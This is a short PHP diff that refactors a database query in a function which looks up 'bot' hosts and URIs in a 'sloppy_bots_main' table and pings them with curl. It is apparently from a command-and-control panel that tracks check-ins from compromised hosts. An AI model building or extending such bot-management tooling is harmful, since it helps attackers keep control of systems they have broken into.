@@ -366,7 +366,7 @@ function aHo($host, $os, $checkIn)
 function check($host, $path, $batch)
 {
     $dbC = pg_connect(DBCONN);
-    $c = pg_exec($dbC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE rhost LIKE '%s'", pg_escape_string($host)));
+    $c = queryDB($host, $batch);
     if (!empty($batch)) {
         switch ($batch) {
             case "y":
@@ -402,7 +402,6 @@ function check($host, $path, $batch)
                 break;
             case "n":
                 if (!empty($host) && !empty($path)) {
-
                     curl_setopt(CHH, CURLOPT_URL, "$c[0]/$c[1]?qs=cqS");
                     curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
                     curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
